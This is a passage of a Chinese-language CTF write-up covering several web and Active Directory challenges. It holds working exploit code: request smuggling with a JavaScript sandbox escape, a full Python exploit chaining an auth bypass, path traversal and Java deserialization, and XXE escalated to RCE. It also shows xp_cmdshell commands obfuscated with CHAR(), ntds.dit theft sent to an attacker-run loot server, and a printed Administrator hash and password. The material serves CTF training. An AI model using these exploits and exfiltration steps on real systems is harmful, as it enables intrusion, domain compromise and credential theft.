    body = p.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in p else ""
    return status, body


def sign(secret, body=""):
    ts = str(int(time.time() * 1000))
    nonce = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
    msg = f"{ts}:{nonce}:{body}"
    token = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {
        "X-Internal-Token": token,
        "X-Timestamp": ts,
        "X-Nonce": nonce,
    }


# 1) 取 fragments
st, b = smuggle("GET", "/internal/secret-fragment")
if st != "200":
    raise SystemExit(f"secret-fragment failed: {st} {b}")
info = json.loads(b)
frags = sorted(info["fragments"], key=lambda x: x["index"])
secret = "".join(x["value"] for x in frags)
print("[+] secret:", secret)

# 2) 关防护
cfg = json.dumps({
    "features": {"astWaf": False, "sandboxHardening": False},
    "security": {"maxCodeLength": 4096}
}, separators=(",", ":"))
st, b = smuggle("POST", "/internal/config", cfg, sign(secret, cfg))
print("[+] config:", st, b[:120])

# 3) 读 flag
payload = "result.constructor.constructor(\"return this.process.mainModule.require('fs').readFileSync('/flag','utf8')\")()"
req = json.dumps({"code": payload}, separators=(",", ":"))
st, b = smuggle("POST", "/internal/sandbox/execute", req, sign(secret, req))
print("[+] execute:", st, b)
```



![](/images/wp/xmctf-wp/image-014.png)



### polaris oa
先把 `jar` 反编译，核心类很少，关键点集中在下面 4 个位置：

1. `SecurityFilter`
2. `DocController`
3. `AjaxController`
4. `ServiceManager`

#### 1. 鉴权绕过
`SecurityFilter` 对普通用户的逻辑是：

+ 先判断是不是管理员
+ 不是管理员时，如果路径以 `/user` 开头，就 `forward`
+ 否则拒绝访问

但这里判断用的是原始 `requestUrl.startsWith("/user")`，而 Spring/Tomcat 在后续路由时会对分号路径做进一步规范化。

因此可以用下面这种路径：

```latex
/user/..;x/ajax
/user/..;x/fileUpload
/user/..;x/docController
```

过滤器看到的是“以 `/user` 开头”，会放行；但 Spring 最终会把请求路由到真正的管理接口。

本题的管理员功能就这样被普通用户拿到了。

#### 2. 任意覆盖 `_parsed` 文件
`DocController.checkIsSign` 里有这段逻辑：

+ 先通过 `fileManager.getFile(fileId)` 找到上传文件
+ 然后把 `fileList` 里的第二段文件名拼到 `sourceFile.getParent()` 后面
+ 最后执行 `FileUtil.decrypt(sourceFile, outputFile)`

伪代码可以理解为：

```java
sourceFile = getFile(fileId)
outputFile = new File(sourceFile.getParent() + "/" + fileName)
decrypt(sourceFile, outputFile)
```

这里虽然做了 `canonicalPath.startsWith(baseDir)` 检查，但 `fileName` 仍然可以使用：

```latex
../../uploads/<target>_parsed
```

这样就能把我们上传的内容，解密后覆盖到：

```latex
data/uploads/<target>_parsed
```

#### 3. 原生 Java 反序列化
`AjaxController` 的 `deserializeData` 会调用：

```java
serviceManager.deserializeData(interfaceRegisterId, fileId);
```

继续跟到 `ServiceManager.deserializeFile`：

```java
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object object = in.readObject();
```

也就是说只要我们能控制 `uploads/<id>_parsed` 的内容，就可以触发原生 Java 反序列化。

#### 4. `parseService` 用来“制造一个已存在的目标文件”
`checkIsSign` 有个前提：目标输出文件必须已经存在，否则它会报“文件不存在”。

这时候可以先调用：

```latex
/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=parseService
```

它会把任意上传文件解析后，正常生成一个：

```latex
uploads/<new_id>_parsed
```

然后再用 `checkIsSign` 把这个文件覆盖成我们的恶意序列化数据。

**利用链**

完整链条如下：

1. 注册普通用户并登录
2. 使用 `/user/..;x/` 绕过管理员鉴权
3. 调用 `fileUpload` 上传恶意序列化数据
4. 调用 `parseService` 生成一个合法存在的 `uploads/<target>_parsed`
5. 调用 `docController.checkIsSign`，把刚上传的恶意文件解密覆盖到 `uploads/<target>_parsed`
6. 调用 `ajax deserializeData` 触发反序列化
7. 调用 `ajax serializeData` 读回执行结果

**反序列化 payload 选择**

最终使用的是：

+ `Jackson POJONode`
+ `Spring AOP JdkDynamicAopProxy`
+ `TemplatesImpl`

触发方式是让 Jackson 在访问代理对象的 `outputProperties` 时，进入 `TemplatesImpl.newTransformer()`，加载恶意字节码。

恶意字节码执行后会：

+ 优先读取常见 flag 路径
+ 最后定位到根目录下的 `/f14g`
+ 把内容写入指定的结果文件 ID，再通过 `serializeData` 回显

侦察阶段回显出了：

```latex
ls(/)=...,app/,f14g
```

因此最终读取目标就是：

```latex
/f14g
```

**关键请求**

上传 payload

```http
POST /user/..;x/fileUpload?method=upload
```

2. 生成合法 `_parsed`

```http
POST /user/..;x/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=parseService
args=[1,<upload_id>]
```

3. 覆盖目标 `_parsed`

```http
POST /user/..;x/docController?method=checkIsSign
recordId=1
fileList=<upload_id>$../../uploads/<target_id>_parsed
```

4. 触发反序列化

```http
POST /user/..;x/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=deserializeData
args=[1,<target_id>]
```

5. 读回结果

```http
POST /user/..;x/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=serializeData
args=[<result_id>]
```



exp

```text
import argparse
import json
import random
import re
import string
import sys
import time
from pathlib import Path

import requests


BASE_DIR = Path(__file__).resolve().parent

MODES = {
    "flag": {
        "payload": BASE_DIR / "payload-final.bin",
        "result_id": "94949494",
    },
    "recon": {
        "payload": BASE_DIR / "payload-recon.bin",
        "result_id": "93939393",
    },
}


def random_user(prefix="polaris"):
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"{prefix}{suffix}"


def is_boot_page(text):
    return "CTF 挑战开启中" in text or "挑战准备就绪" in text


def wait_ready(base_url, timeout=120):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(base_url + "/login", timeout=10)
            if r.status_code == 200 and "Polaris OA" in r.text and not is_boot_page(r.text):
                return
        except requests.RequestException:
            pass
        time.sleep(3)
    raise RuntimeError("target did not become ready in time")


def register_and_login(session, base_url, username, password):
    r = session.post(
        base_url + "/register",
        data={"username": username, "password": password, "confirmPassword": password},
        timeout=20,
    )
    print("[*] register:", r.text)

    r = session.post(
        base_url + "/login",
        data={"username": username, "password": password},
        timeout=20,
    )
    print("[*] login:", r.text)
    if "success|user" not in r.text and "success|admin" not in r.text:
        raise RuntimeError("login failed")


def upload_payload(session, base_url, payload_path):
    with payload_path.open("rb") as f:
        r = session.post(
            base_url + "/user/..;x/fileUpload?method=upload",
            files={"file1": ("payload.txt", f, "application/octet-stream")},
            timeout=30,
        )
    print("[*] upload:", r.text)
    m = re.search(r"(\d+)$", r.text)
    if not m:
        raise RuntimeError("could not parse upload id")
    return m.group(1)


def parse_service(session, base_url, upload_id):
    r = session.post(
        base_url + "/user/..;x/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=parseService",
        data={"args": f"[1,{upload_id}]"},
        timeout=30,
    )
    print("[*] parseService:", r.text)
    target_id = r.text.strip()
    if not target_id.isdigit():
        raise RuntimeError("parseService failed")
    return target_id


def overwrite_parsed(session, base_url, upload_id, target_id):
    r = session.post(
        base_url + "/user/..;x/docController?method=checkIsSign",
        data={
            "recordId": "1",
            "fileList": f"{upload_id}$../../uploads/{target_id}_parsed",
        },
        timeout=30,
    )
    print("[*] checkIsSign:", r.text)
    if r.text.strip() != "0":
        raise RuntimeError("overwrite failed")


def trigger_deserialize(session, base_url, target_id):
    try:
        r = session.post(
            base_url + "/user/..;x/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=deserializeData",
            data={"args": f"[1,{target_id}]"},
            timeout=20,
        )
        print("[*] deserialize:", r.text[:300])
        return r.text
    except requests.RequestException as exc:
        print("[*] deserialize request exception:", exc)
        return ""


def fetch_result(session, base_url, result_id, retries=15, delay=2):
    for idx in range(retries):
        time.sleep(delay)
        try:
            r = session.post(
                base_url + "/user/..;x/ajax?method=ajaxAction&managerName=serviceManager&managerMethod=serializeData",
                data={"args": f"[{result_id}]"},
                timeout=20,
            )
            print(f"[*] serializeData try {idx}: {r.text[:300]}")
            if r.text and r.text != "null" and not is_boot_page(r.text):
                return json.loads(r.text)
        except requests.RequestException as exc:
            print(f"[*] serializeData try {idx} exception:", exc)
        except json.JSONDecodeError:
            pass
    raise RuntimeError("failed to fetch result")


def main():
    parser = argparse.ArgumentParser(description="Polaris OA exploit")
    parser.add_argument(
        "--url",
        default="http://8080-c32866c5-dd2d-426a-860d-ef5d6f2e176a.challenge.ctfplus.cn",
        help="target base url",
    )
    parser.add_argument(
        "--mode",
        choices=sorted(MODES),
        default="flag",
        help="flag: directly read /f14g, recon: enumerate interesting directories",
    )
    parser.add_argument("--username", default=None, help="optional username")
    parser.add_argument("--password", default="12345678", help="password to register/login")
    args = parser.parse_args()

    mode = MODES[args.mode]
    payload_path = mode["payload"]
    result_id = mode["result_id"]

    if not payload_path.exists():
        raise SystemExit(f"payload not found: {payload_path}")

    print("[*] waiting for target to be ready")
    wait_ready(args.url)

    session = requests.Session()
    username = args.username or random_user()
    register_and_login(session, args.url, username, args.password)

    upload_id = upload_payload(session, args.url, payload_path)
    target_id = parse_service(session, args.url, upload_id)
    overwrite_parsed(session, args.url, upload_id, target_id)
    trigger_deserialize(session, args.url, target_id)

    if args.mode == "flag":
        wait_ready(args.url, timeout=90)
        session = requests.Session()
        register_and_login(session, args.url, random_user("fetch"), args.password)

    result = fetch_result(session, args.url, result_id)
    print("[+] result:", result)
    if result:
        print("[+] first entry:", result[0])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        sys.exit(1)
```



![](/images/wp/xmctf-wp/image-015.png)





### 头像上传器
题目表面上是“头像上传 + 白名单扩展名校验”，但真正的坑在 svg。

上传点只校验扩展名：

```text
$allowed = ['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg'];
$ext = strtolower(pathinfo($orig, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed, true)) {
    json_response(['ok' => false, 'error' => '不支持的文件类型。'], 400);
}
```

头像读取点 /api/avatar.php 对 svg 做了 XML 解析：

```text
$dom = new DOMDocument();
$dom->resolveExternals = true;
$dom->substituteEntities = true;
$dom->load($path, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
echo $dom->saveXML();

```

这就是标准 XXE：

resolveExternals = true  
substituteEntities = true  
LIBXML_NOENT | LIBXML_DTDLOAD  
所以“白名单允许 svg”并不安全，反而把 XML 外部实体直接放进来了

这就是标准 XXE：

**2.先打 XXE，拿到任意文件读取**

注册登录后，上传一个恶意 SVG，再把它设为头像即可。

最小 PoC：

```text
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="1" y="20">&xxe;</text>
</svg>
```

然后把回显的 base64 解码。

读到的关键源码是：

```text
//很高兴你发现了这里，接下来该这么rce呢？
```

3. 通过 XXE 继续摸环境

继续读了这些内容：

```text
/var/www/html/api/*.php
/var/www/html/index.php
/var/log/nginx/error.log
/usr/local/bin/docker-php-entrypoint
```

关键结论：

```text
/index.php 是 phpinfo()
PHP 版本是 7.4.27
open_basedir = no value
disable_functions = no value
/flag 存在，但 www-data 无权限读取
```

  
错误日志里明确出现：

```text
DOMDocument::load(/flag): failed to open stream: Permission denied
```

也就是说：

+ XXE 任意读已经成立
+ flag 就在 /flag
+ 但当前 web 权限不够，必须进一步 RCE / 提权

用 CNEXT 把任意读升级成 RCE

这里我用的是 Ambionics 的 cnext-exploit.py 思路。

但这个题有一个很重要的适配点：

默认 CNEXT 生成的是这种 URI：

```text
php://filter/read=f1|f2|f3/resource=data:text/plain;base64,...
```

 这个在普通 file_get_contents() 场景能用，但在本题的 DOMDocument::load() 里会被 libxml 判成：

```text
Invalid URI
```

测试发现 libxml：

```text
认单个 filter
不认带 | 的 filter 链
但认“嵌套单 filter”写法
```

例如这个是能成功的：

```text
php://filter/read=string.toupper/resource=php://filter/read=string.rot13/resource=data:text/plain,abc
```

所以把 exploit path 生成逻辑改成嵌套即可：

```text
path = resource
for filter_name in filters:
    path = f"php://filter/read={filter_name}/resource={path}"
```

再把 Remote.send() 适配成：

```text
上传一个包含 SYSTEM "{path}" 的 xxe.svg
调 /api/update_profile.php 设为头像
GET /api/avatar.php
```

这样 CNEXT 就能在这个题目里打通

 pad=0 就成功拿到了 www-data RCE。验证命令比如：

```text
touch /var/www/html/uploads/probe.txt
```

5.RCE后枚举提权

先确认当前权限

```text
uid=33(www-data) gid=33(www-data)
```

然后找SUID:

```text
find / -perm -4000 -type f 2>/dev/null | sort
```

命中一个关键文件

```text
/readflag
```

最后rce执行

```text
/readflag > /var/www/html/uploads/final_flag.txt 2>&1
```

访问

```text
/uploads/final_flag.txt
```

拿到flag





### BabyDC
下载好镜像后直接导入

![](/images/wp/xmctf-wp/image-016.png)

打开发现用户需要密码，猜测靶机启动了web服务

尝试访问主机的网络信息，

```text
& 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe' guestproperty enumerate 'Bloodstained '
```

![](/images/wp/xmctf-wp/image-017.png)

拿到关键信息

靶机ip是10.78.22.137，扫一下常见的端口

![](/images/wp/xmctf-wp/image-018.png)

发现存在一些服务，我在 Kali 中使用 nmap 扫描目标时，返回结果显示相关端口均为 filtered，可能是因为我kali在vm另一套网络里，可能有隔离。猜测开放了 Web 与 MSSQL 等服务。

访问一下

```text
http://10.78.22.137/
```

![](/images/wp/xmctf-wp/image-019.png)

```markdown
从指纹来看，Web 服务器为：

- `Microsoft-IIS/10.0`
```

然后目录扫描一下有没有备份文件之类的

```text
dirsearch -u http://10.78.22.137/ -e txt,config,bak,old,zip
```

发现泄露了文件

[http://10.78.22.137/poo_connection.txt](http://10.78.22.137/poo_connection.txt)

![](/images/wp/xmctf-wp/image-020.png)

给出了mssql登录凭据

尝试登录执行sql

![](/images/wp/xmctf-wp/image-021.png)

成功连接了mssql，本地身份是最低权限用户，wuwupor

验证 linked server 上下文

```text
EXEC ('SELECT @@SERVERNAME AS srv, SYSTEM_USER AS sysu, SUSER_NAME() AS susern, ORIGINAL_LOGIN() AS origl, USER_NAME() AS usern, IS_SRVROLEMEMBER(''sysadmin'') AS issa') AT [POO_PUBLIC];
```

明显能切到sa上下文，说明我们虽然当前本地登录身份只是 `wuwupor`，但通过 `POO_PUBLIC` 能拿到远程 `sa` 级别权限。

执行

```text
EXEC ('DECLARE @c NVARCHAR(20)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @c;') AT [POO_PUBLIC];
```

![](/images/wp/xmctf-wp/image-022.png)

说明当前远程命令执行的身份是

xmcve\sqlsvc

可以执行系统命令

看系统开放的端口

```text
EXEC ('DECLARE @c NVARCHAR(100)=CHAR(110)+CHAR(101)+CHAR(116)+CHAR(115)+CHAR(116)+CHAR(97)+CHAR(116)+CHAR(32)+CHAR(45)+CHAR(97)+CHAR(110)+CHAR(111)+CHAR(32)+CHAR(124)+CHAR(32)+CHAR(102)+CHAR(105)+CHAR(110)+CHAR(100)+CHAR(115)+CHAR(116)+CHAR(114)+CHAR(32)+CHAR(76)+CHAR(73)+CHAR(83)+CHAR(84)+CHAR(69)+CHAR(78)+CHAR(73)+CHAR(78)+CHAR(71); EXEC xp_cmdshell @c;') AT [POO_PUBLIC];
```

![](/images/wp/xmctf-wp/image-023.png)

![](/images/wp/xmctf-wp/image-024.png)

枚举用户

```text
EXEC ('DECLARE @c NVARCHAR(50)=CHAR(110)+CHAR(101)+CHAR(116)+CHAR(32)+CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)+CHAR(32)+CHAR(109)+CHAR(111)+CHAR(119)+CHAR(101)+CHAR(110)+CHAR(32)+CHAR(47)+CHAR(100)+CHAR(111)+CHAR(109)+CHAR(97)+CHAR(105)+CHAR(110); EXEC xp_cmdshell @c;') AT [POO_PUBLIC];
```

![](/images/wp/xmctf-wp/image-025.png)

可以看到：

+ 用户名：`mowen`
+ 所属组：`Backup Operators`

同时从镜像中残留的构建资料和在线验证可知，当前机器中还存在以下关键凭据：

+ `wuwupor / lovlyBaby`
+ `mowen / 1maxwell`
+ `p2zhh / p2zhh_web`

其中最有价值的是：

```latex
mowen / 1maxwell
```

因为 `mowen` 属于 `Backup Operators`，具备进一步导出敏感系统数据的潜力。

验证mowen身份权限

```text
@'
import pymssql
import time

host='10.78.22.137'
user='wuwupor'
password='lovlyBaby'

conn = pymssql.connect(
    server=host,
    user=user,
    password=password,
    database='master',
    port='1433',
    login_timeout=8,
    timeout=60,
    charset='UTF-8',
    autocommit=True
)

cur = conn.cursor()

cmds = [
    (
        '创建计划任务',
        r'schtasks /create /tn xmcvepub /sc once /st 23:59 /ru XMCVE\mowen /rp "1maxwell" /tr "cmd /c whoami /all > C:\Users\Public\mowen.txt" /f'
    ),
    (
        '运行计划任务',
        r'schtasks /run /tn xmcvepub'
    ),
    (
        '查看 Public 目录',
        r'dir C:\Users\Public'
    ),
    (
        '读取 whoami /all 输出',
        r'type C:\Users\Public\mowen.txt'
    )
]

for title, cmd in cmds:
    print("\n" + "="*25)
    print(title)
    print("="*25)
    print("CMD>", cmd)

    chars = '+'.join(f'CHAR({ord(ch)})' for ch in cmd)
    sql = f"EXEC ('DECLARE @c NVARCHAR(4000)={chars}; EXEC xp_cmdshell @c;') AT [POO_PUBLIC];"

    try:
        cur.execute(sql)
        rows = cur.fetchall()
        for row in rows:
            print(row[0])
    except Exception as e:
        print("报错:", e)

    if title == '运行计划任务':
        time.sleep(4)

cur.close()
conn.close()
'@ | python -

```

![](/images/wp/xmctf-wp/image-026.png)

![](/images/wp/xmctf-wp/image-027.png)

![](/images/wp/xmctf-wp/image-028.png)

输出中能看到：

+ 账号身份：`xmcve\mowen`
+ 所属组：`BUILTIN\Backup Operators`
+ 拥有权限：
    - `SeBackupPrivilege`
    - `SeRestorePrivilege`

这意味着 `mowen` 已经具备通过备份语义读取高权限文件的潜力。

尝试连接mowen

```text
$env:Path += ';C:\Windows\System32;C:\Windows'
& 'C:\Windows\System32\cmdkey.exe' /generic:TERMSRV/10.78.22.137 /user:XMCVE\mowen /pass:1maxwell
& 'C:\Windows\System32\mstsc.exe' /v:10.78.22.137
```

发现连不上

![](/images/wp/xmctf-wp/image-029.png)

写脚本进行远程拿文件

在一个终端开启

```text
New-Item -ItemType Directory -Force D:\ctf\loot | Out-Null

$server = @'
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

UPLOAD_DIR = r"D:\ctf\loot"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class H(BaseHTTPRequestHandler):
    def do_PUT(self):
        name = os.path.basename(self.path.lstrip('/')) or 'upload.bin'
        length = int(self.headers.get('Content-Length', '0'))
        path = os.path.join(UPLOAD_DIR, name)
        with open(path, 'wb') as f:
            remaining = length
            while remaining > 0:
                chunk = self.rfile.read(min(65536, remaining))
                if not chunk:
                    break
                f.write(chunk)
                remaining -= len(chunk)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, fmt, *args):
        pass

HTTPServer(('0.0.0.0', 8000), H).serve_forever()
'@

Set-Content D:\ctf\loot_server.py $server -Encoding ASCII
python D:\ctf\loot_server.py

```

开另一个终端

```text
$export = @'
import pymssql
import time

HOST='10.78.22.137'
USER='wuwupor'
PASS='lovlyBaby'
LOOT_HOST='10.78.22.44'
TASK='xmcve_export_0329'

def run_cmd(cur, cmd):
    chars = '+'.join(f'CHAR({ord(c)})' for c in cmd)
    sql = f"EXEC ('DECLARE @c NVARCHAR(4000)={chars}; EXEC xp_cmdshell @c;') AT [POO_PUBLIC];"
    print("\n" + "="*80)
    print("CMD>", cmd)
    print("="*80)
    cur.execute(sql)
    try:
        rows = cur.fetchall()
        for row in rows:
            if row and row[0] is not None:
                print(row[0])
    except:
        pass

conn = pymssql.connect(
    server=HOST,
    user=USER,
    password=PASS,
    database='master',
    port='1433',
    login_timeout=8,
    timeout=120,
    charset='UTF-8',
    autocommit=True
)
cur = conn.cursor()

cmds = [
    r'del C:\Users\Public\ds.txt 2>nul',
    r'cmd /c echo set context persistent nowriters > C:\Users\Public\ds.txt',
    r'cmd /c echo add volume c: alias cdrive >> C:\Users\Public\ds.txt',
    r'cmd /c echo create >> C:\Users\Public\ds.txt',
    r'cmd /c echo expose %%cdrive%% z: >> C:\Users\Public\ds.txt',
    r'type C:\Users\Public\ds.txt',

    r'del C:\Users\Public\do_export.bat 2>nul',
    r'cmd /c echo diskshadow /s C:\Users\Public\ds.txt > C:\Users\Public\do_export.bat',
    r'cmd /c echo robocopy /b z:\Windows\NTDS C:\Users\Public ntds.dit >> C:\Users\Public\do_export.bat',
    r'cmd /c echo reg save HKLM\SYSTEM C:\Users\Public\SYSTEM /y >> C:\Users\Public\do_export.bat',
    rf'cmd /c echo powershell -nop -c "Invoke-WebRequest -Uri http://{LOOT_HOST}:8000/ntds.dit -Method Put -InFile C:\Users\Public\ntds.dit -UseBasicParsing" >> C:\Users\Public\do_export.bat',
    rf'cmd /c echo powershell -nop -c "Invoke-WebRequest -Uri http://{LOOT_HOST}:8000/SYSTEM -Method Put -InFile C:\Users\Public\SYSTEM -UseBasicParsing" >> C:\Users\Public\do_export.bat',
    r'type C:\Users\Public\do_export.bat',

    rf'schtasks /create /tn {TASK} /sc once /st 23:59 /ru XMCVE\mowen /rp "1maxwell" /tr "cmd /c C:\Users\Public\do_export.bat" /f',
    rf'schtasks /run /tn {TASK}'
]

for c in cmds:
    run_cmd(cur, c)

print("\n[+] waiting 120 seconds...")
time.sleep(120)

post_cmds = [
    rf'schtasks /query /tn {TASK} /fo LIST /v',
    r'dir C:\Users\Public',
    r'type C:\Users\Public\ds.txt',
    r'type C:\Users\Public\do_export.bat'
]

for c in post_cmds:
    run_cmd(cur, c)

cur.close()
conn.close()
'@

Set-Content D:\ctf\run_export.py $export -Encoding ASCII
python D:\ctf\run_export.py

```

拿到ntds.dit和SYSTEM

**离线提取 Administrator 哈希**

在成功拿到 `ntds.dit` 和 `SYSTEM` 后，就可以在本机进行离线解析，提取域内用户哈希。

我这里使用 `impacket-secretsdump`：

```bash
python -m impacket.examples.secretsdump -system D:\ctf\babydc\SYSTEM -ntds D:\ctf\babydc\ntds.dit LOCAL
```

![](/images/wp/xmctf-wp/image-030.png)

执行后会输出域内用户的 NTLM 哈希，重点关注 Administrator 对应的记录

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
```

由此可以得到：

Administrator 的 RID 为 500

Administrator 的 NT hash 为：

```text
d94f9831271e229dbc6e712097b63168
```

明文就是

```text
jU@Li&us@!#!
```

我们直接登录拿shell去执行命令拿flag

```text
$target = '10.78.22.137'
$user   = 'XMCVE\Administrator'
$pass   = 'jU@Li&us@!#!'
$share  = "\\$target\C$"

& 'C:\Windows\System32\cmdkey.exe' /add:$target /user:$user /pass:$pass
& 'C:\Windows\System32\net.exe' use $share $pass /user:$user

$cmd = 'cmd /c whoami > C:\Windows\Temp\proof.txt 2>&1 & hostname >> C:\Windows\Temp\proof.txt 2>&1 & ipconfig >> C:\Windows\Temp\proof.txt 2>&1 & dir C:\Users\Administrator\Desktop >> C:\Windows\Temp\proof.txt 2>&1 & type C:\Users\Administrator\Desktop\flag.txt > C:\Windows\Temp\flag.txt 2>&1'

& 'C:\Windows\System32\wbem\WMIC.exe' /node:$target /user:$user /password:$pass process call create $cmd

Start-Sleep -Seconds 8

Get-Content "$share\Windows\Temp\proof.txt"
Get-Content "$share\Windows\Temp\flag.txt"

```

flag

```text
FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
```
